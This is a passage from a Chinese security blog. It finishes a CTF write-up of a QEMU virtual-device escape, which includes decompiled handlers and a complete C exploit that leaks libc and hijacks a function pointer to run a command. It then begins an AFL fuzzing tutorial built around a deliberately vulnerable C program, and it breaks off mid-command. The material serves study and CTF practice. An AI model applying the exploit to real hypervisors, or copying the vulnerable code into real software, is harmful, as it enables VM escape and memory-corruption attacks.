class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v13; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = opaque-&gt;seek + (addr &gt;&gt; <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( opaque-&gt;mmio_write_part )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = &amp;opaque-&gt;pdev.qdev.parent_obj.class + v4;</span><br><span class="line">      v6 = val &lt;&lt; <span class="number">32</span>;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">0</span>;</span><br><span class="line">      v8 = opaque-&gt;key[<span class="number">0</span>];</span><br><span class="line">      v9 = opaque-&gt;key[<span class="number">1</span>];</span><br><span class="line">      v10 = opaque-&gt;key[<span class="number">2</span>];</span><br><span class="line">      v11 = opaque-&gt;key[<span class="number">3</span>];</span><br><span class="line">      v12 = v6 + *(v5 + <span class="number">0x2B6</span>);</span><br><span class="line">      v13 = (v5[<span class="number">0x15B</span>] + v6) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 -= <span class="number">0x61C88647</span>;</span><br><span class="line">        v12 += (v7 + v13) ^ (v9 + (v13 &gt;&gt; <span class="number">5</span>)) ^ (v8 + <span class="number">16</span> * v13);</span><br><span class="line">        LODWORD(v13) = ((v7 + v12) ^ (v11 + (v12 &gt;&gt; <span class="number">5</span>)) ^ (v10 + <span class="number">16</span> * v12)) + v13;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v7 != <span class="number">0xC6EF3720</span> );</span><br><span class="line">      v5[<span class="number">0x15B</span>] = __PAIR64__(v13, v12);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;blocks[v4] = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>mmio_write</code>函数中首先一样先通过seek和addr得到index，第一次使用时是直接在低32位写入输入的数据，后面的则是低32位和高32位进行tea加密随后写入到地址位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">d3dev_pmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> *key; <span class="comment">// rbp</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( val &lt;= <span class="number">0x100</span> )</span><br><span class="line">      opaque-&gt;seek = val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">28</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;r_seed = val;</span><br><span class="line">      key = opaque-&gt;key;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        *key++ = (opaque-&gt;rand_r)(&amp;opaque-&gt;r_seed, <span class="number">28LL</span>, val, *&amp;size);</span><br><span class="line">      <span class="keyword">while</span> ( key != &amp;opaque-&gt;rand_r );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( addr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *opaque-&gt;key = <span class="number">0LL</span>;</span><br><span class="line">      *&amp;opaque-&gt;key[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;memory_mode = val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里不说<code>pmio_read</code>函数了，因为确实没啥用就不浪费篇幅了。这里看<code>pmio_write</code>函数，可以喊到在port等于28时会给<code>r_seek</code>赋值，并且会调用<code>opaque-&gt;rand_r</code>第一个参数就是<code>opaque-&gt;r_seed</code>的地址。而在addr等于8并且val小于0x100时则是往seek中写入值。可以看出来这里漏洞一样是存在越界使用结构体。</p><h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>这里的利用思路也是较为清晰的</p><ol><li>  首先修改seek配合addr实现使用<code>mmio_write</code>函数实现越界写，将<code>opaque-&gt;rand_r</code>原有的函数地址进行tea加密并且写入到当前位置。</li><li>  两次调用<code>mmio_read</code>函数，分别读取<code>opaque-&gt;rand_r</code>高位和低位泄漏出libc地址，进而拿到system地址。</li><li>  应为<code>r_seek</code>成员和<code>blocks</code>成员紧邻的缘故，恢复seek为0并通过addr在<code>blocks</code>成员开始位置写入<code>flag</code></li><li>  最后直接调用<code>pmio_write</code>并且port为28修改<code>r_seed</code>为<code>nl /</code>即可调用<code>nl /flag</code></li></ol><h3 id="综上，exp-1"><a href="#综上，exp-1" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *userbuf;</span><br><span class="line"><span class="keyword">uint64_t</span> phy_userbuf;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> port_base = <span class="number">0xc040</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">size_t</span> port, <span class="keyword">u_int32_t</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(val, port_base + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">size_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> inl(port_base + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">tea</span><span class="params">(<span class="keyword">size_t</span> m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> v3;</span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> v4;   <span class="comment">// esi</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">    <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    v3 = m;</span><br><span class="line">    v4 = <span class="number">-957401312</span>;</span><br><span class="line">    v5 = v3;</span><br><span class="line">    result = v3 &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        result = result - ((v5 + v4) ^ (key[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (key[<span class="number">2</span>] + <span class="number">16</span> * v5));</span><br><span class="line">        v5 -= (result + v4) ^ (key[<span class="number">1</span>] + ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)result &gt;&gt; <span class="number">5</span>)) ^ (key[<span class="number">0</span>] + <span class="number">16</span> * result);</span><br><span class="line">        v4 += <span class="number">1640531527</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> (v4);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%lx\n&quot;</span>, v5);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%lx\n&quot;</span>, result);</span><br><span class="line">    <span class="keyword">return</span> result &lt;&lt; <span class="number">32</span> | (<span class="keyword">u_int64_t</span>)v5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/bus/pci/devices/0000:00:03.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;iopl fail!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> rand_r;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> libc_base;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> system_addr;</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">8</span>, <span class="number">0x100</span>);</span><br><span class="line">    mmio_write(<span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>, <span class="number">0</span>);</span><br><span class="line">    rand_r = mmio_read(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">    rand_r += ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)mmio_read(<span class="number">0x18</span>)) &lt;&lt; <span class="number">32</span>;</span><br><span class="line">    libc_base = rand_r - <span class="number">0x25d30</span>;</span><br><span class="line">    system_addr = libc_base + <span class="number">0x30290</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, rand_r);</span><br><span class="line"></span><br><span class="line">    key[<span class="number">0</span>] = pmio_read(<span class="number">12</span>);</span><br><span class="line">    key[<span class="number">1</span>] = pmio_read(<span class="number">16</span>);</span><br><span class="line">    key[<span class="number">2</span>] = pmio_read(<span class="number">20</span>);</span><br><span class="line">    key[<span class="number">3</span>] = pmio_read(<span class="number">24</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;key%d: %p\n&quot;</span>, i, key[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> t_system_addr;</span><br><span class="line">    t_system_addr = tea(system_addr);</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x18</span>, t_system_addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>, t_system_addr &gt;&gt; <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0</span>, <span class="number">0x67616c66</span>);</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">28</span>, <span class="number">0x2f206c6e</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230321154453844.png"                      alt="image-20230321154453844"                ></p><hr><p>题目链接:<br>    <a class="link"   href="https://github.com/196082/196082/tree/main/qemu_escape" >https://github.com/196082/196082/tree/main/qemu_escape<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;可以看得出来这篇文章的标题十分的水，因为确实是很难找到这两道题又什么闪光点来作为标题。这篇文章更新后会暂停学习qemu了，后续会进一步学习AFL以及开始接触docker逃逸。&lt;/p&gt;
&lt;h2 id=&quot;FastCP-ctf&quot;&gt;&lt;a href=&quot;#FastCP-ctf&quot; cla</summary>
      
    
    
    
    <category term="qemu escape" scheme="https://cv196082.gitee.io/categories/qemu-escape/"/>
    
    
    <category term="mmio" scheme="https://cv196082.gitee.io/tags/mmio/"/>
    
    <category term="pmio" scheme="https://cv196082.gitee.io/tags/pmio/"/>
    
  </entry>
  
  <entry>
    <title>FUZZ(1):初探AFL</title>
    <link href="https://cv196082.gitee.io/2023/03/18/%E5%88%9D%E6%8E%A2AFL/"/>
    <id>https://cv196082.gitee.io/2023/03/18/%E5%88%9D%E6%8E%A2AFL/</id>
    <published>2023-03-18T06:32:59.000Z</published>
    <updated>2023-03-18T07:33:05.013Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本篇文章主要是为网鼎杯线下赛做准备，不会涉及到AFL的原理，主要的方向为AFL的使用。</p><h2 id="AFL-FUZZ介绍"><a href="#AFL-FUZZ介绍" class="headerlink" title="AFL-FUZZ介绍"></a>AFL-FUZZ介绍</h2><p>AFL则是fuzzing的一个很好用的工具，全称是American Fuzzy Lop，由Google安全工程师Michał Zalewski开发的一款开源fuzzing测试工具，可以高效地对二进制程序进行fuzzing，挖掘可能存在的内存安全漏洞，如栈溢出、堆溢出、UAF、double free等。由于需要在相关代码处插桩，因此AFL主要用于对开源软件进行测试。当然配合QEMU等工具，也可对闭源二进制代码进行fuzzing，但执行效率会受到影响。</p><h2 id="白盒下的FUZZ"><a href="#白盒下的FUZZ" class="headerlink" title="白盒下的FUZZ"></a>白盒下的FUZZ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为A并且长度为66，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it is good!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);<span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);<span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    vuln(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概流程：</p><p>首先是用afl-gcc编译源代码进行插桩，然后以测试文件为输入，然后启动afl-fuzz程序，将testcase作为程序的输入执行程序，afl会在这个testcase的基础上进行自动变异输入，使得程序产生crash，产生了crash就会被记录起来</p><h3 id="编译插桩"><a href="#编译插桩" class="headerlink" title="编译插桩"></a>编译插桩</h3><p>首先是面对上面这类小文件时采取的方法就是直接进行编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-gcc -g -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure><p>但是面对编译项目时，大多会使用到Makefile。如果存在configure的话肯定是可以在里面直接进行修改，如果没有的话可以直接修改Makefile或者添加以下内容:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CC=/path/to/afl/afl-gcc</span><br><span class="line">CXX=/path/to/afl/afl-g++</span><br></pre></td></tr></table></figure><p> 当然面对clang或者clang++的话也是一样的。</p><h3 id="开始FUZZ"><a href="#开始FUZZ" class="headerlink" title="开始FUZZ"></a>开始FUZZ</h3><p>对那些可以直接从stdin读取输入的目标程序来说，语法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i testcase_dir -o findings_dir /path/to/program […params…]</span><br></pre></td></tr></table></figure><p>对从文件读取输入的目标程序来说，要用“@@”，语法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure><p>而对于这里命令为:<code>afl-fuzz -i input_dir -o output_dir ./test</code></p><p>其中-i选项时输入测试文件的目录，-o选项时输出结果文件的目录。</p><p>对于这个简单的例子，测试文件只需要随便输入点东西就行，这里选择输入<code>hello</code></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230318133051229.png"                      alt="image-20230318133051229"                >一般会出现上图中的问题，解决办法就是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line"><span class="built_in">echo</span> core &gt;/proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230318134324644.png"                      alt="image-20230318134324644"                ></p><p>上图就是AFL的界面，上面的内容根据前面的注释基本可以猜出来一二，不过跑了十分钟只跑出了五处crash就挺离谱的，这个跑的结果与testcase和电脑性能以及运气都有一定关系。</p><h3 id="分析crashes"><a href="#分析crashes" class="headerlink" title="分析crashes"></a>分析crashes</h3><h4 id="id-000000-sig-06-src-000001-op-havoc-rep-128样例"><a href="#id-000000-sig-06-src-000001-op-havoc-rep-128样例" class="headerlink" title="id:000000,sig:06,src:000001,op:havoc,rep:128样例"></a><strong>id:000000,sig:06,src:000001,op:havoc,rep:128样例</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  crashes xxd id:000000,sig:06,src:000001,op:havoc,rep:128 </span><br><span class="line">00000000: 8001 8001 92a8 c3e4 c3c3 c3fa c3ea e4c3  ................</span><br><span class="line">00000010: c3c3 fac3 ea04 2310 0423 1000 1010 0000  ......<span class="comment">#..#......</span></span><br><span class="line">00000020: 9b00 1000 009b 0100 f5f5 0423 1000 1010  ...........<span class="comment">#....</span></span><br><span class="line">00000030: 0000 9b00 1000 009b 0100 f5f5 f5f5 f5f5  ................</span><br><span class="line">00000040: f5f5 f5f5 f5f5 f5f5 f5f5 00fa 0423 1000  .............<span class="comment">#..</span></span><br><span class="line">00000050: 1000 0000 20f5 0064 1000 009b 0010 0000  .... ..d........</span><br><span class="line">00000060: 9b01 0001 92fa 0023 1000 1000 0003 2300  .......<span class="comment">#......#.</span></span><br><span class="line">00000070: 6410 0000 9b15                           d.....</span><br></pre></td></tr></table></figure><p>可以猜测为栈溢出</p><h4 id="id-000001-sig-06-src-000001-op-havoc-rep-128样例"><a href="#id-000001-sig-06-src-000001-op-havoc-rep-128样例" class="headerlink" title="id:000001,sig:06,src:000001,op:havoc,rep:128样例"></a><strong>id:000001,sig:06,src:000001,op:havoc,rep:128样例</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  crashes xxd id:000001,sig:06,src:000001,op:havoc,rep:128 </span><br><span class="line">00000000: 7fb8 b7b8 207f 0001 7fb7 f9ff ffff f9ff  .... ...........</span><br><span class="line">00000010: ffff ff17 ffff ffff 7f7f 7fb7 f9ff ffff  ................</span><br><span class="line">00000020: f9ff ffff ff17 ffff ffff e0ff b8ff ffdd  ................</span><br><span class="line">00000030: b8b7 b8da 8008 00f9 fa00 00f9 f087 8080  ................</span><br><span class="line">00000040: 80ff f9ff ffff ff17 ffff ffff 7f7f 7fb7  ................</span><br><span class="line">00000050: f9ff ffff f9ff ffff ff17 ffff ffff ff80  ................</span><br><span class="line">00000060: 69b8 00d8 bdda 80b8 00d8 bdda ff7f 7fb8  i...............</span><br></pre></td></tr></table></figure><p>一样的应该也是栈溢出导致的</p><h4 id="id-000002-sig-11-src-000000-op-flip1-pos-1样例"><a href="#id-000002-sig-11-src-000000-op-flip1-pos-1样例" class="headerlink" title="id:000002,sig:11,src:000000,op:flip1,pos:1样例"></a><strong>id:000002,sig:11,src:000000,op:flip1,pos:1样例</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  crashes xxd 